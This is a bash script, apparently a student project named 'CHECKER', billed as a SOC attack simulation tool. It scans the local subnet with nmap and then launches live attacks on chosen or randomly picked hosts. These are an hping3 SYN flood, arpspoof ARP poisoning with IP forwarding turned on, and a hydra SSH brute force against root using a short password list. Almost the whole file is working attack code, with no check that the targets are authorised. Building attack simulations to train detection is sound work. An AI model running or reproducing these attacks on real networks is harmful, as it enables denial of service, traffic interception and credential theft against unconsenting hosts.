#!/bin/bash

# Name: Tomer Dery
# Project: CHECKER - SOC Analyst Attack Simulation Tool

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

#Logging Files Pathes
LOG_FILE="/var/log/attack log files.txt"
NMAP_OUTPUT="/var/log/nmap_scan_output.txt"
Excluded_Host_IP=$(hostname -I | awk '{print $1}')

#echo $Excluded_Host_IP
Check_for_root(){
    if [[ $(id -u) -ne 0 ]] ; then
    echo -e "${RED} The script must run with Root privilege${NC}"
    exit 1
    fi
}
Check_for_root

figlet "CHECKER Soc tool"

#Function to prompt the user to select a valid network interface from available interface
ChooseNetworkInterface(){
    echo -e "${CYAN}[*]${NC}${YELLOW} Aviable network interfaces in the host:${NC}"
    interfaces=()
    interfaces=($(ip -o link show | awk -F ':' '{gsub(/^ +| +$/, "", $2); print $2}')) 
    ip_addresses=() 
    valid_interfaces=() 
    index=1
    for iface in "${interfaces[@]}";do 
        ip_addr=$(ip -o -4 addr list "$iface" | awk '{print $4}' | cut -d '/' -f1)
        if [[ ! -z "$ip_addr" ]] ; then 
            ip_addresses+=("$ip_addr")
            valid_interfaces+=("$iface")
            echo -e "${BLUE}$index) $iface - $ip_addr${NC}"
            ((index++))
        fi
    done
    while true; do
        read -p "$(echo -e "${YELLOW}[?]${NC}${CYAN} please choose the network interface by number ${NC}")" choice
        regex='^[0-9]+$'
        if [[ "$choice" =~ $regex ]] && [ "$choice" -ge 1 ] && [ "$choice" -le "${#valid_interfaces[@]}" ]; then
            chosen_interface="${valid_interfaces[$((choice-1))]}"
            ntip="${ip_addresses[$((choice-1))]}"
            echo -e "${BLUE}[+]${NC}${GREEN} you have chosen $chosen_interface with IP $ntip${NC}"
            break
        else
            echo -e "${RED}[!] The interface chosen is invalid. Please enter a number between 1 and ${#valid_interfaces[@]}.${NC}"
        fi
    done
}
ChooseNetworkInterface

echo -e "${CYAN}[?]${NC}${GREEN} Please select the type of Nmap scanning to run:${NC}"
echo -e "${BLUE}1) Fast scan${NC}"
echo -e "${BLUE}2) Full scan${NC}"
echo -e "${BLUE}3) Vuln scanning${NC}"
read -p "$(echo -e "${GREEN}[?]${NC}${YELLOW} Choose your scan type (1-3): ${NC}")" scan_type

case $scan_type in 
    1)
        scan_command="nmap -Pn -F --exclude $Excluded_Host_IP $ntip/24 -oN $NMAP_OUTPUT"
        ;;
    2)
        scan_command="nmap -sS -Pn -O -A -sU -p- --exclude $Excluded_Host_IP $ntip/24 -oN $NMAP_OUTPUT"
        ;;
    3)
        scan_command="nmap --script vuln -A -p- -Pn --exclude $Excluded_Host_IP $ntip/24 -oN $NMAP_OUTPUT"
        ;;
esac
echo -e "${GREEN}[*] Running nmap scan... This may take a while${NC}"
eval $scan_command
echo -e "${GREEN}[+] Scan complete!${NC}"

# Function to extract and display discovered hosts from nmap scan
Display_Found_IPs(){
    echo -e "${CYAN}[*]${NC}${YELLOW} Discovered hosts on the network:${NC}"
    
    # Extract IP addresses from nmap output file
    # grep finds lines with "Nmap scan report for"
    # awk prints the last field (the IP)
    # tr removes parentheses if present
    discovered_ips=($(grep "Nmap scan report for" $NMAP_OUTPUT | awk '{print $NF}' | tr -d '()'))
    
    # Check if we found any hosts
    if [ ${#discovered_ips[@]} -eq 0 ]; then
        echo -e "${RED}[!] No hosts found on the network. Exiting.${NC}"
        exit 1
    fi
    
    # Display each IP with a number
    for i in "${!discovered_ips[@]}"; do
        echo -e "${BLUE}$((i+1))) ${discovered_ips[$i]}${NC}"
    done
}
# Call the function
Display_Found_IPs

# Function to display available attack options with descriptions
Show_Attack_Menu(){
    echo -e "\n${CYAN}[*]${NC}${GREEN} Available Attack Options:${NC}"
    echo -e "${BLUE}1) DOS Attack (Hping3)${NC} - Floods target with SYN packets to overwhelm resources"
    echo -e "${BLUE}2) MITM Attack (Arpspoof)${NC} - ARP poisoning to intercept network traffic"
    echo -e "${BLUE}3) Brute Force (Hydra)${NC} - Attempts to crack SSH passwords"
    echo -e "${BLUE}4) Random Attack${NC} - Randomly selects one of the above attacks"
}

# Function to get user's attack choice
Get_Attack_Choice(){
Show_Attack_Menu
    
    while true; do
        read -p "$(echo -e "${YELLOW}[?]${NC}${CYAN} Choose attack type (1-4): ${NC}")" attack_choice
        
        # Validate input
        if [[ "$attack_choice" =~ ^[1-4]$ ]]; then
            # If random is chosen, pick a random number between 1-3
            if [ "$attack_choice" -eq 4 ]; then
                attack_choice=$((RANDOM % 3 + 1))
                echo -e "${GREEN}[+] Randomly selected attack: $attack_choice${NC}"
            fi
            break
        else
            echo -e "${RED}[!] Invalid choice. Please enter a number between 1 and 4.${NC}"
        fi
    done
}

# Function to let user choose target IP (specific or random)
Get_Target_IP(){
    echo -e "\n${CYAN}[*]${NC}${YELLOW} Target Selection:${NC}"
    echo -e "${BLUE}1) Choose specific IP from list${NC}"
    echo -e "${BLUE}2) Random target from discovered IPs${NC}"
    
    while true; do
        read -p "$(echo -e "${YELLOW}[?]${NC}${CYAN} Select target method (1-2): ${NC}")" target_method
        
        if [[ "$target_method" =~ ^[1-2]$ ]]; then
            if [ "$target_method" -eq 1 ]; then
                # Show IPs again and let user choose
                echo -e "${CYAN}[*]${NC}${YELLOW} Available targets:${NC}"
                for i in "${!discovered_ips[@]}"; do
                    echo -e "${BLUE}$((i+1))) ${discovered_ips[$i]}${NC}"
                done
                
                while true; do
                    read -p "$(echo -e "${YELLOW}[?]${NC}${CYAN} Choose target number: ${NC}")" target_num
                    
                    if [[ "$target_num" =~ ^[0-9]+$ ]] && [ "$target_num" -ge 1 ] && [ "$target_num" -le "${#discovered_ips[@]}" ]; then
                        target_ip="${discovered_ips[$((target_num-1))]}"
                        echo -e "${GREEN}[+] Target selected: $target_ip${NC}"
                        break
                    else
                        echo -e "${RED}[!] Invalid selection. Choose between 1 and ${#discovered_ips[@]}${NC}"
                    fi
                done
                
            else
                # Random selection
                random_index=$((RANDOM % ${#discovered_ips[@]}))
                target_ip="${discovered_ips[$random_index]}"
                echo -e "${GREEN}[+] Random target selected: $target_ip${NC}"
            fi
            break
        else
            echo -e "${RED}[!] Invalid choice. Please enter 1 or 2.${NC}"
        fi
    done
}

# Function 1: DOS Attack using Hping3
DOS_Attack(){
    echo -e "${RED}[!] Launching DOS Attack on $target_ip${NC}"
    echo -e "${YELLOW}[*] Sending SYN flood packets...${NC}"
    
    # Send 1000 SYN packets as fast as possible
    # -S = SYN flag, -p 80 = port 80, --flood = fast mode, -c = count
    timeout 10 hping3 -S -p 80 --flood -c 1000 $target_ip > /dev/null 2>&1
    
    if [ $? -eq 0 ] || [ $? -eq 124 ]; then
        echo -e "${GREEN}[+] DOS Attack completed${NC}"
        return 0
    else
        echo -e "${RED}[!] DOS Attack failed${NC}"
        return 1
    fi
}

# Function 2: MITM Attack using Arpspoof
MITM_Attack(){
    echo -e "${RED}[!] Launching MITM Attack on $target_ip${NC}"
    echo -e "${YELLOW}[*] Starting ARP poisoning...${NC}"
    
    # Get gateway IP (usually .1 in the subnet)
    gateway=$(ip route | grep default | awk '{print $3}')
    
    # Enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    # Run arpspoof for 15 seconds in background
    # This poisons the ARP cache of target and gateway
    timeout 15 arpspoof -i $chosen_interface -t $target_ip $gateway > /dev/null 2>&1 &
    arpspoof_pid=$!
    
    sleep 15
    
    # Stop arpspoof and disable IP forwarding
    kill $arpspoof_pid 2>/dev/null
    echo 0 > /proc/sys/net/ipv4/ip_forward
    
    echo -e "${GREEN}[+] MITM Attack completed${NC}"
    return 0
}

# Function 3: Brute Force Attack using Hydra
Brute_Force_Attack(){
    echo -e "${RED}[!] Launching Brute Force Attack on $target_ip${NC}"
    echo -e "${YELLOW}[*] Attempting SSH password cracking...${NC}"
    
    # Create a simple wordlist if it doesn't exist
    wordlist="/tmp/simple_passwords.txt"
    if [ ! -f "$wordlist" ]; then
        echo -e "123456\npassword\nadmin\nroot\n12345678" > $wordlist
    fi
    
    # Try to crack SSH (port 22) with username 'root'
    # -l = login, -P = password file, -t = threads, -vV = verbose
    timeout 30 hydra -l root -P $wordlist -t 4 ssh://$target_ip > /dev/null 2>&1
    
    if [ $? -eq 0 ] || [ $? -eq 124 ]; then
        echo -e "${GREEN}[+] Brute Force Attack completed${NC}"
        return 0
    else
        echo -e "${RED}[!] Brute Force Attack completed (no valid credentials found)${NC}"
        return 0
    fi
}

# Function to execute the chosen attack based on user selection
Execute_Attack(){
    echo -e "\n${CYAN}[*]${NC}${GREEN} Executing attack...${NC}"
    
    case $attack_choice in
        1)
            attack_name="DOS Attack"
            DOS_Attack
            attack_status=$?
            ;;
        2)
            attack_name="MITM Attack"
            MITM_Attack
            attack_status=$?
            ;;
        3)
            attack_name="Brute Force Attack"
            Brute_Force_Attack
            attack_status=$?
            ;;
    esac
}

# Function to log the attack details
Log_Attack(){
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    # Create log entry
    log_entry="[${timestamp}] Attack Type: ${attack_name} | Target IP: ${target_ip} | Interface: ${chosen_interface} | Status: "
    
    if [ $attack_status -eq 0 ]; then
        log_entry="${log_entry}SUCCESS"
    else
        log_entry="${log_entry}FAILED"
    fi
    
    # Write to log file
    echo "$log_entry" >> "$LOG_FILE"
    
    echo -e "${GREEN}[+] Attack logged to $LOG_FILE${NC}"
}

# Function to ask if user wants to run another attack
Ask_Continue(){
    echo -e "\n${CYAN}[?]${NC}${YELLOW} Do you want to run another attack?${NC}"
    echo -e "${BLUE}1) Yes - Run another attack${NC}"
    echo -e "${BLUE}2) No - Exit${NC}"
    
    while true; do
        read -p "$(echo -e "${YELLOW}[?]${NC}${CYAN} Your choice (1-2): ${NC}")" continue_choice
        
        if [[ "$continue_choice" =~ ^[1-2]$ ]]; then
            if [ "$continue_choice" -eq 1 ]; then
                return 0  # Continue
            else
                return 1  # Exit
            fi
        else
            echo -e "${RED}[!] Invalid choice. Please enter 1 or 2.${NC}"
        fi
    done
}

# Main loop
while true; do
    # Get attack choice and target (no need to rescan network)
    Get_Attack_Choice
    Get_Target_IP
    Execute_Attack
    Log_Attack
    
    # Ask if user wants to continue
    if ! Ask_Continue; then
        echo -e "${GREEN}[+] Thank you for using CHECKER SOC Tool!${NC}"
        echo -e "${CYAN}[*] Logs saved to: $LOG_FILE${NC}"
        exit 0
    fi
done
